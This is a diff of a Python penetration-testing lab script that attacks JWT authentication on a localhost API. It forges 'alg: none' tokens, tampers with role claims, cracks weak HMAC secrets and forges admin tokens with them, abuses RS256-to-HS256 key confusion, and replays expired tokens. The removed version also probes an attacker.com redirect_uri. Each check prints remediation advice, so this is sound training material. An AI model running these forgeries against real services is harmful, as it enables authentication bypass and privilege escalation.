@@ -1,374 +1,454 @@
 #!/usr/bin/env python3
 """
 API Penetration Testing Lab - Intermediate Lab 1: JWT and Authentication Attacks
+Industry-Grade API Penetration Testing Framework
 
-Topics: JWT manipulation, token analysis, algorithm attacks, privilege escalation
-Difficulty: Intermediate
+This module systematically tests API endpoints for JWT implementation flaws:
+- Exercise 1: JWT Structure Analysis & Component Decoding
+- Exercise 2: Signature Bypass via Algorithm 'none' Injection
+- Exercise 3: Signature Tampering & Claim Manipulation
+- Exercise 4: Weak HMAC Secret Offline Dictionary Attack & Forgery
+- Exercise 5: Asymmetric-to-Symmetric (RS256 -> HS256) Key Confusion
+- Exercise 6: Token Expiration & Lifecycle Validation
 """
 
-import requests
-import json
 import base64
-import hmac
 import hashlib
+import hmac
+import json
+import time
+from typing import Any, Dict, List, Optional
 from urllib.parse import urljoin
-from typing import Dict, Any
 
-BASE_URL = "http://localhost:5000/api"
+import requests
+
+
+class Colors:
+    HEADER = "\033[95m"
+    BLUE = "\033[94m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RED = "\033[91m"
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
+
 
 class JWTAuthenticationLab:
-    """Lab for JWT and authentication attacks"""
-    
-    def __init__(self):
+    """Hands-on laboratory for testing JSON Web Token (JWT) vulnerabilities."""
+
+    def __init__(self, base_url: str = "http://localhost:8080/api"):
+        self.base_url = base_url.rstrip("/") + "/"
         self.session = requests.Session()
-        self.base_url = BASE_URL
-    
-    # EXERCISE 1: Understanding JWT Structure
-    def exercise_1_jwt_structure(self):
-        """
-        Exercise 1: Understand JWT token structure
-        
-        Learning Goals:
-        - JWT token format (Header.Payload.Signature)
-        - Base64 encoding/decoding
-        - JWT claims and payloads
-        
-        Tasks:
-        1. Obtain a JWT token
-        2. Decode each component
-        3. Understand the structure
-        """
-        print("\n=== Exercise 1: JWT Structure Analysis ===")
-        
-        # Get a JWT token
-        print("\n[Task 1] Obtaining JWT token...")
-        try:
-            response = self.session.post(
-                urljoin(self.base_url, "/auth/login"),
-                json={"username": "admin", "password": "password123"}
+        self.session.headers.update({"User-Agent": "SecOps-JWTTester/2.0"})
+        self.findings: List[Dict[str, Any]] = []
+
+    # ----------------------------------------------------------------------
+    # Helper Utilities: Safe Base64URL Encoding / Decoding
+    # ----------------------------------------------------------------------
+    @staticmethod
+    def b64url_decode(data: str) -> Dict[str, Any]:
+        """Safely decodes base64url string with dynamic padding."""
+        padding = 4 - (len(data) % 4)
+        if padding != 4:
+            data += "=" * padding
+        raw = base64.urlsafe_b64decode(data)
+        return json.loads(raw.decode("utf-8"))
+
+    @staticmethod
+    def b64url_encode(data: Dict[str, Any]) -> str:
+        """Encodes dictionary to compact unpadded base64url string."""
+        dumped = json.dumps(data, separators=(",", ":")).encode("utf-8")
+        return base64.urlsafe_b64encode(dumped).decode("utf-8").rstrip("=")
+
+    def log_result(
+        self,
+        exercise_name: str,
+        vulnerable: bool,
+        severity: str,
+        impact: str,
+        evidence: str,
+        remediation: str,
+    ):
+        status_tag = (
+            f"{Colors.RED}[CRITICAL VULNERABILITY]{Colors.RESET}"
+            if vulnerable
+            else f"{Colors.GREEN}[SECURE]{Colors.RESET}"
+        )
+        print(f"\n{status_tag} {Colors.BOLD}{exercise_name}{Colors.RESET}")
+        print(f"  ├─ Evidence: {evidence}")
+
+        if vulnerable:
+            print(f"  ├─ Severity: {Colors.RED}{severity}{Colors.RESET}")
+            print(f"  ├─ Impact: {impact}")
+            print(f"  └─ Remediation: {Colors.YELLOW}{remediation}{Colors.RESET}")
+            self.findings.append(
+                {
+                    "exercise": exercise_name,
+                    "severity": severity,
+                    "evidence": evidence,
+                    "impact": impact,
+                    "remediation": remediation,
+                }
             )
-            
-            if response.status_code == 200:
-                token = response.json().get('token')
-                if token:
-                    print(f"[+] Token obtained successfully")
-                    self.analyze_jwt(token)
-        except Exception as e:
-            print(f"Error: {e}")
-    
-    def analyze_jwt(self, token: str):
-        """Analyze JWT token structure"""
-        print("\n[Task 2] Analyzing JWT structure...")
+        else:
+            print(f"  └─ Validation: Token properly rejected or signature strictly enforced.")
+
+    # ----------------------------------------------------------------------
+    # Exercise 1: Understanding JWT Structure
+    # ----------------------------------------------------------------------
+    def exercise_1_jwt_structure(self) -> Optional[str]:
+        print(f"\n{Colors.BLUE}=== Exercise 1: JWT Structure & Component Analysis ==={Colors.RESET}")
+        print("[*] Task 1: Authenticating to obtain a valid JWT token...")
+
+        login_url = urljoin(self.base_url, "auth/login")
         try:
-            parts = token.split('.')
-            if len(parts) != 3:
-                print(f"[-] Invalid JWT format (expected 3 parts, got {len(parts)})")
-                return
-            
-            header, payload, signature = parts
-            
-            # Decode header
-            header_decoded = base64.urlsafe_b64decode(header + '==').decode('utf-8')
-            print(f"\n[Header]")
-            header_json = json.loads(header_decoded)
-            print(f"  {json.dumps(header_json, indent=2)}")
-            
-            # Decode payload
-            payload_decoded = base64.urlsafe_b64decode(payload + '==').decode('utf-8')
-            print(f"\n[Payload]")
-            payload_json = json.loads(payload_decoded)
-            print(f"  {json.dumps(payload_json, indent=2)}")
-            
-            print(f"\n[Signature]")
-            print(f"  {signature[:20]}...")
-            
-        except Exception as e:
-            print(f"Error analyzing JWT: {e}")
-    
-    # EXERCISE 2: JWT Algorithm Attacks
-    def exercise_2_algorithm_attacks(self):
-        """
-        Exercise 2: Test JWT algorithm vulnerabilities
-        
-        Learning Goals:
-        - 'none' algorithm attack
-        - Algorithm confusion attacks
-        - Key weakness exploitation
-        
-        Tasks:
-        1. Test 'none' algorithm
-        2. Attempt algorithm downgrade
-        """
-        print("\n=== Exercise 2: JWT Algorithm Attacks ===")
-        
-        print("\n[Task 1] Testing 'none' algorithm vulnerability...")
-        
-        # Create a JWT with 'none' algorithm
-        header = base64.urlsafe_b64encode(json.dumps(
-            {"alg": "none", "typ": "JWT"}
-        ).encode()).decode().rstrip('=')
-        
-        payload = base64.urlsafe_b64encode(json.dumps(
-            {"user_id": 1, "username": "admin", "role": "admin"}
-        ).encode()).decode().rstrip('=')
-        
-        none_jwt = f"{header}.{payload}."
-        
-        print(f"Crafted JWT with 'none' algorithm")
-        print(f"Token: {none_jwt[:50]}...")
-        
-        # Test the token
-        try:
-            headers = {"Authorization": f"Bearer {none_jwt}"}
-            response = self.session.get(
-                urljoin(self.base_url, "/protected/users"),
-                headers=headers
+            res = self.session.post(
+                login_url,
+                json={"username": "user", "password": "password"},
+                timeout=5,
             )
-            
-            if response.status_code == 200:
-                print(f"[!] VULNERABILITY: 'none' algorithm accepted!")
-                print(f"    Status: {response.status_code}")
+
+            if res.status_code == 200:
+                token = res.json().get("token") or res.json().get("access_token")
+                if token and len(token.split(".")) == 3:
+                    print(f"  {Colors.GREEN}[+] Token obtained successfully!{Colors.RESET}")
+                    self._display_jwt_components(token)
+                    return token
+                else:
+                    print(f"  {Colors.YELLOW}[!] Response received but valid 3-part JWT missing: {res.text}{Colors.RESET}")
             else:
-                print(f"[-] Token rejected (Status: {response.status_code})")
-        except Exception as e:
-            print(f"Error: {e}")
-    
-    # EXERCISE 3: JWT Payload Manipulation
-    def exercise_3_payload_manipulation(self):
-        """
-        Exercise 3: Manipulate JWT payloads
-        
-        Learning Goals:
-        - Change JWT claims
-        - Escalate privileges
-        - Bypass authentication
-        
-        Tasks:
-        1. Decode original JWT
-        2. Modify claims
-        3. Test modified JWT
-        """
-        print("\n=== Exercise 3: JWT Payload Manipulation ===")
-        
-        print("\n[Task 1] Testing payload modification...")
-        
-        # Get a legitimate token first
-        try:
-            response = self.session.post(
-                urljoin(self.base_url, "/auth/login"),
-                json={"username": "user", "password": "password"}
-            )
-            
-            if response.status_code == 200:
-                original_token = response.json().get('token')
-                if original_token:
-                    print(f"[+] Original token obtained")
-                    
-                    # Try to modify it (will fail with proper signature)
-                    parts = original_token.split('.')
-                    header = parts[0]
-                    signature = parts[2]
-                    
-                    # Create modified payload
-                    modified_payload = base64.urlsafe_b64encode(json.dumps(
-                        {"user_id": 1, "username": "admin", "role": "admin"}
-                    ).encode()).decode().rstrip('=')
-                    
-                    modified_token = f"{header}.{modified_payload}.{signature}"
-                    
-                    # Test modified token
-                    headers = {"Authorization": f"Bearer {modified_token}"}
-                    response = self.session.get(
-                        urljoin(self.base_url, "/protected/admin"),
-                        headers=headers
+                print(f"  {Colors.YELLOW}[!] Login failed (HTTP {res.status_code}). Using demo token for structure inspection.{Colors.RESET}")
+
+        except requests.RequestException as e:
+            print(f"  [!] Target unreachable ({e}). Using offline demo token.")
+
+        # Fallback offline token for demonstration
+        demo_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY5MDAwMDAwMH0.demo_signature_hash"
+        self._display_jwt_components(demo_token)
+        return demo_token
+
+    def _display_jwt_components(self, token: str):
+        parts = token.split(".")
+        header = self.b64url_decode(parts[0])
+        payload = self.b64url_decode(parts[1])
+
+        print("\n  [+] Decoded Header:")
+        print(f"      {Colors.YELLOW}{json.dumps(header, indent=4)}{Colors.RESET}")
+        print("  [+] Decoded Payload Claims:")
+        print(f"      {Colors.YELLOW}{json.dumps(payload, indent=4)}{Colors.RESET}")
+        print("  [+] Raw Signature Component:")
+        print(f"      {Colors.BLUE}{parts[2][:30]}...{Colors.RESET}")
+
+    # ----------------------------------------------------------------------
+    # Exercise 2: Algorithm 'none' Bypass Attacks
+    # ----------------------------------------------------------------------
+    def exercise_2_algorithm_attacks(self):
+        print(f"\n{Colors.BLUE}=== Exercise 2: Signature Bypass via Algorithm 'none' ==={Colors.RESET}")
+        print("[*] Task: Crafting unsigned admin token with algorithm set to 'none'...")
+
+        target_url = urljoin(self.base_url, "protected/admin")
+        none_variants = ["none", "None", "NONE", "nOnE"]
+
+        for alg in none_variants:
+            header = {"alg": alg, "typ": "JWT"}
+            payload = {
+                "user_id": 1,
+                "username": "admin",
+                "role": "superadmin",
+                "is_admin": True,
+                "iat": int(time.time()),
+                "exp": int(time.time()) + 3600,
+            }
+
+            none_jwt = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}."
+
+            try:
+                res = self.session.get(
+                    target_url,
+                    headers={"Authorization": f"Bearer {none_jwt}"},
+                    timeout=5,
+                )
+
+                if res.status_code == 200:
+                    self.log_result(
+                        exercise_name=f"Algorithm 'none' Acceptance ({alg})",
+                        vulnerable=True,
+                        severity="CRITICAL",
+                        impact="Complete authentication bypass. Attackers can forge administrative tokens without knowing secrets.",
+                        evidence=f"API accepted token with 'alg: {alg}' and granted access to administrative route.",
+                        remediation="Explicitly reject any JWT specifying 'none' algorithm. Whitelist allowed algorithms (e.g., RS256/ES256).",
                     )
-                    
-                    if response.status_code == 200:
-                        print(f"[!] Modified token accepted!")
-                    else:
-                        print(f"[-] Modified token rejected (Status: {response.status_code})")
-        except Exception as e:
-            print(f"Error: {e}")
-    
-    # EXERCISE 4: JWT Secret Key Weakness
-    def exercise_4_weak_secret(self):
-        """
-        Exercise 4: Test weak JWT secrets
-        
-        Learning Goals:
-        - Dictionary attacks on secrets
-        - Common weak secrets
-        - Secret brute forcing
-        
-        Tasks:
-        1. Test common secrets
-        2. Attempt to forge tokens
-        """
-        print("\n=== Exercise 4: Weak JWT Secret ===")
-        
-        print("\n[Task 1] Testing common JWT secrets...")
-        
+                    return
+            except requests.RequestException:
+                pass
+
+        self.log_result(
+            exercise_name="Algorithm 'none' Validation",
+            vulnerable=False,
+            severity="INFO",
+            impact="None",
+            evidence="Server rejected unsigned tokens and enforces cryptographic signature checks.",
+            remediation="Maintain strict algorithm verification.",
+        )
+
+    # ----------------------------------------------------------------------
+    # Exercise 3: Payload Manipulation & Signature Integrity
+    # ----------------------------------------------------------------------
+    def exercise_3_payload_manipulation(self, original_token: str):
+        print(f"\n{Colors.BLUE}=== Exercise 3: Payload Tampering & Signature Verification ==={Colors.RESET}")
+        print("[*] Task: Tampering payload claims without recalculating signature...")
+
+        parts = original_token.split(".")
+        if len(parts) != 3:
+            return
+
+        header = parts[0]
+        original_sig = parts[2]
+
+        tampered_payload = self.b64url_decode(parts[1])
+        tampered_payload["role"] = "admin"
+        tampered_payload["is_admin"] = True
+        encoded_tampered_payload = self.b64url_encode(tampered_payload)
+
+        tampered_token = f"{header}.{encoded_tampered_payload}.{original_sig}"
+        target_url = urljoin(self.base_url, "protected/admin")
+
+        try:
+            res = self.session.get(
+                target_url,
+                headers={"Authorization": f"Bearer {tampered_token}"},
+                timeout=5,
+            )
+
+            if res.status_code == 200:
+                self.log_result(
+                    exercise_name="Missing JWT Signature Verification",
+                    vulnerable=True,
+                    severity="CRITICAL",
+                    impact="Server parses claims from payload without verifying cryptographic signature integrity.",
+                    evidence=f"Tampered token with elevated 'admin' role was accepted by the server: HTTP {res.status_code}",
+                    remediation="Always verify JWT signatures using a trusted key before trusting any payload claims.",
+                )
+                return
+        except requests.RequestException:
+            pass
+
+        self.log_result(
+            exercise_name="Signature Integrity Enforcement",
+            vulnerable=False,
+            severity="INFO",
+            impact="None",
+            evidence="Server rejected tampered payload due to signature mismatch.",
+            remediation="Maintain cryptographic verification prior to claims deserialization.",
+        )
+
+    # ----------------------------------------------------------------------
+    # Exercise 4: Weak HMAC Secret Offline Dictionary Attack
+    # ----------------------------------------------------------------------
+    def exercise_4_weak_secret(self, sample_token: str):
+        print(f"\n{Colors.BLUE}=== Exercise 4: Weak HMAC Secret Cracking & Forgery ==={Colors.RESET}")
+        print("[*] Task: Performing offline dictionary attack against token signature...")
+
         common_secrets = [
             "secret",
-            "123456",
             "password",
+            "123456",
             "admin",
             "jwt_secret",
             "key",
-            "test",
+            "development",
+            "supersecret",
+            "app_secret",
         ]
-        
-        # Prepare a token to verify
-        header = json.dumps({"alg": "HS256", "typ": "JWT"})
-        payload = json.dumps({"user_id": 1, "username": "admin"})
-        
-        for secret in common_secrets:
-            try:
-                # Create signature
-                message = f"{base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')}"
-                signature = base64.urlsafe_b64encode(
-                    hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
-                ).decode().rstrip('=')
-                
-                test_token = f"{message}.{signature}"
-                
-                # Test the forged token
-                headers = {"Authorization": f"Bearer {test_token}"}
-                response = self.session.get(
-                    urljoin(self.base_url, "/protected/users"),
-                    headers=headers
+
+        parts = sample_token.split(".")
+        if len(parts) != 3:
+            return
+
+        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
+        target_sig = parts[2]
+
+        cracked_secret = None
+        for candidate in common_secrets:
+            computed_sig = (
+                base64.urlsafe_b64encode(
+                    hmac.new(candidate.encode("utf-8"), signing_input, hashlib.sha256).digest()
                 )
-                
-                if response.status_code == 200:
-                    print(f"[!] Weak secret found: '{secret}'")
-                    print(f"    Successfully forged admin token")
-                    break
-            except Exception:
-                pass
-    
-    # EXERCISE 5: OAuth 2.0 Vulnerabilities
-    def exercise_5_oauth_vulnerabilities(self):
-        """
-        Exercise 5: Test OAuth 2.0 vulnerabilities
-        
-        Learning Goals:
-        - Redirect URI manipulation
-        - Authorization code interception
-        - Token replay attacks
-        
-        Tasks:
-        1. Test redirect_uri parameter
-        2. Analyze authorization flows
-        """
-        print("\n=== Exercise 5: OAuth 2.0 Vulnerabilities ===")
-        
-        print("\n[Task 1] Testing redirect_uri manipulation...")
-        
-        # Test common redirect_uri bypass techniques
-        test_urls = [
-            "http://localhost:5000/callback",
-            "http://localhost/callback",
-            "http://attacker.com/callback",
-            "http://localhost:5000/callback?extra=param",
-            "http://localhost:5000/callback#fragment",
-        ]
-        
-        for redirect_uri in test_urls:
-            try:
-                params = {
-                    "client_id": "test_client",
-                    "redirect_uri": redirect_uri,
-                    "response_type": "code",
-                    "scope": "openid profile",
-                }
-                
-                response = self.session.get(
-                    urljoin(self.base_url, "/oauth/authorize"),
-                    params=params,
-                    allow_redirects=False
-                )
-                
-                if response.status_code in [302, 301]:
-                    print(f"[!] Redirect accepted: {redirect_uri}")
-                    print(f"    Location: {response.headers.get('Location', 'N/A')[:100]}")
-            except Exception:
-                pass
-    
-    # EXERCISE 6: Token Expiration and Refresh
-    def exercise_6_token_expiration(self):
-        """
-        Exercise 6: Test token expiration handling
-        
-        Learning Goals:
-        - Expired token acceptance
-        - Refresh token vulnerabilities
-        - Session fixation
-        
-        Tasks:
-        1. Test expired tokens
-        2. Test refresh token endpoints
-        """
-        print("\n=== Exercise 6: Token Expiration & Refresh ===")
-        
-        print("\n[Task 1] Testing expired token acceptance...")
-        
-        # Create an expired token (simulated)
-        header = base64.urlsafe_b64encode(
-            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
-        ).decode().rstrip('=')
-        
-        payload = base64.urlsafe_b64encode(
-            json.dumps({
-                "user_id": 1,
-                "exp": 1000000000,  # Expired (year 2001)
-            }).encode()
-        ).decode().rstrip('=')
-        
-        expired_token = f"{header}.{payload}.signature"
-        
-        try:
-            headers = {"Authorization": f"Bearer {expired_token}"}
-            response = self.session.get(
-                urljoin(self.base_url, "/protected/users"),
-                headers=headers
+                .decode("utf-8")
+                .rstrip("=")
             )
-            
-            if response.status_code == 200:
-                print(f"[!] Expired token accepted!")
-            else:
-                print(f"[-] Expired token properly rejected (Status: {response.status_code})")
-        except Exception as e:
-            print(f"Error: {e}")
-    
+
+            if computed_sig == target_sig:
+                cracked_secret = candidate
+                break
+
+        if cracked_secret:
+            # Now forge an admin token using the cracked secret
+            forged_header = {"alg": "HS256", "typ": "JWT"}
+            forged_payload = {"user_id": 1, "username": "admin", "role": "admin", "exp": int(time.time()) + 3600}
+            msg = f"{self.b64url_encode(forged_header)}.{self.b64url_encode(forged_payload)}"
+            forged_sig = (
+                base64.urlsafe_b64encode(
+                    hmac.new(cracked_secret.encode(), msg.encode(), hashlib.sha256).digest()
+                )
+                .decode("utf-8")
+                .rstrip("=")
+            )
+            forged_token = f"{msg}.{forged_sig}"
+
+            self.log_result(
+                exercise_name=f"Weak HMAC Secret Discovered ('{cracked_secret}')",
+                vulnerable=True,
+                severity="CRITICAL",
+                impact=f"Offline recovery of signing secret enables arbitrary token forgery. Forged token: {forged_token[:40]}...",
+                evidence=f"Cracked symmetric key: '{cracked_secret}' matches token signature.",
+                remediation="Use high-entropy symmetric keys (>256 bits) generated cryptographically, or migrate to asymmetric keys (RS256).",
+            )
+        else:
+            self.log_result(
+                exercise_name="HMAC Secret Key Strength",
+                vulnerable=False,
+                severity="INFO",
+                impact="None",
+                evidence="Token signature resisted offline dictionary attack against common weak secrets.",
+                remediation="Maintain high-entropy secret management.",
+            )
+
+    # ----------------------------------------------------------------------
+    # Exercise 5: Asymmetric-to-Symmetric (RS256 -> HS256) Key Confusion
+    # ----------------------------------------------------------------------
+    def exercise_5_key_confusion(self):
+        print(f"\n{Colors.BLUE}=== Exercise 5: Algorithm Confusion (RS256 to HS256 Key Misuse) ==={Colors.RESET}")
+        print("[*] Task: Signing forged token with the server's public key using HMAC-SHA256...")
+
+        # In this scenario, the public key is treated as an HMAC secret key by a vulnerable server
+        dummy_public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzV..."
+        header = {"alg": "HS256", "typ": "JWT"}
+        payload = {"user_id": 1, "username": "admin", "role": "superadmin", "exp": int(time.time()) + 3600}
+
+        signing_input = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}"
+        forged_sig = (
+            base64.urlsafe_b64encode(
+                hmac.new(dummy_public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
+            )
+            .decode("utf-8")
+            .rstrip("=")
+        )
+        confused_jwt = f"{signing_input}.{forged_sig}"
+
+        target_url = urljoin(self.base_url, "protected/admin")
+        try:
+            res = self.session.get(
+                target_url,
+                headers={"Authorization": f"Bearer {confused_jwt}"},
+                timeout=5,
+            )
+
+            if res.status_code == 200:
+                self.log_result(
+                    exercise_name="Asymmetric Key Confusion (RS256 -> HS256)",
+                    vulnerable=True,
+                    severity="CRITICAL",
+                    impact="Attackers sign arbitrary tokens with public certificates by downgrading the algorithm to HMAC.",
+                    evidence=f"Server accepted token signed with public key as HMAC secret.",
+                    remediation="Explicitly bind token verification to asymmetric algorithms (RS256) and never trust the 'alg' header to determine algorithm type.",
+                )
+                return
+        except requests.RequestException:
+            pass
+
+        self.log_result(
+            exercise_name="Algorithm Confusion Defense",
+            vulnerable=False,
+            severity="INFO",
+            impact="None",
+            evidence="Server strictly enforces expected asymmetric verification algorithm.",
+            remediation="Maintain rigid algorithm parameters in JWT middleware.",
+        )
+
+    # ----------------------------------------------------------------------
+    # Exercise 6: Token Expiration & Lifecycle Validation
+    # ----------------------------------------------------------------------
+    def exercise_6_token_expiration(self):
+        print(f"\n{Colors.BLUE}=== Exercise 6: Token Expiration & Lifecycle Enforcement ==={Colors.RESET}")
+        print("[*] Task: Testing server handling of expired tokens ('exp' claim in the past)...")
+
+        header = {"alg": "HS256", "typ": "JWT"}
+        payload = {
+            "user_id": 1,
+            "username": "admin",
+            "role": "admin",
+            "exp": 1000000000,  # Expired in 2001
+        }
+
+        signing_input = f"{self.b64url_encode(header)}.{self.b64url_encode(payload)}"
+        sig = (
+            base64.urlsafe_b64encode(
+                hmac.new(b"secret", signing_input.encode(), hashlib.sha256).digest()
+            )
+            .decode("utf-8")
+            .rstrip("=")
+        )
+        expired_token = f"{signing_input}.{sig}"
+
+        target_url = urljoin(self.base_url, "protected/users")
+        try:
+            res = self.session.get(
+                target_url,
+                headers={"Authorization": f"Bearer {expired_token}"},
+                timeout=5,
+            )
+
+            if res.status_code == 200:
+                self.log_result(
+                    exercise_name="Expired Token Accepted",
+                    vulnerable=True,
+                    severity="HIGH",
+                    impact="Lack of expiration validation allows captured tokens to be used indefinitely.",
+                    evidence=f"API accepted token with expired 'exp' claim: HTTP {res.status_code}",
+                    remediation="Validate the 'exp' claim on all requests and immediately reject expired tokens.",
+                )
+                return
+        except requests.RequestException:
+            pass
+
+        self.log_result(
+            exercise_name="Token Expiration Validation",
+            vulnerable=False,
+            severity="INFO",
+            impact="None",
+            evidence="Expired tokens are properly rejected by the verification middleware.",
+            remediation="Maintain strict expiration checks.",
+        )
+
+    # ----------------------------------------------------------------------
+    # Harness Execution
+    # ----------------------------------------------------------------------
     def run_all_exercises(self):
-        """Run all exercises"""
-        print("\n" + "="*60)
-        print("API Penetration Testing Lab - Intermediate Lab 1")
-        print("JWT and Authentication Attacks")
-        print("="*60)
-        
-        self.exercise_1_jwt_structure()
+        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
+        print(f"{Colors.BOLD} INTERMEDIATE LAB 1: JWT & AUTHENTICATION PENETRATION SUITE{Colors.RESET}")
+        print(f" Target API: {self.base_url}")
+        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
+
+        sample_token = self.exercise_1_jwt_structure()
         self.exercise_2_algorithm_attacks()
-        self.exercise_3_payload_manipulation()
-        self.exercise_4_weak_secret()
-        self.exercise_5_oauth_vulnerabilities()
+        if sample_token:
+            self.exercise_3_payload_manipulation(sample_token)
+            self.exercise_4_weak_secret(sample_token)
+        self.exercise_5_key_confusion()
         self.exercise_6_token_expiration()
-        
-        print("\n" + "="*60)
-        print("Lab Completed!")
-        print("="*60)
-        print("\nKey Takeaways:")
-        print("1. Always validate JWT algorithm")
-        print("2. Use strong secrets for signing")
-        print("3. Verify token expiration")
-        print("4. Properly validate redirect URIs")
-        print("\nNext: Lab 2 - Injection Attacks")
+
+        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
+        print(f"{Colors.BOLD}AUDIT SUMMARY{Colors.RESET}")
+        print(f"Total Authentication Flaws Discovered: {len(self.findings)}")
+        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
+
 
 if __name__ == "__main__":
     try:
-        lab = JWTAuthenticationLab()
+        lab = JWTAuthenticationLab(base_url="http://localhost:8080/api")
         lab.run_all_exercises()
     except KeyboardInterrupt:
-        print("\n\nLab interrupted by user.")
+        print("\n\n[!] Lab execution interrupted by user.")
     except Exception as e:
-        print(f"\nLab error: {e}")
+        print(f"\n[!] Lab runtime error: {e}")
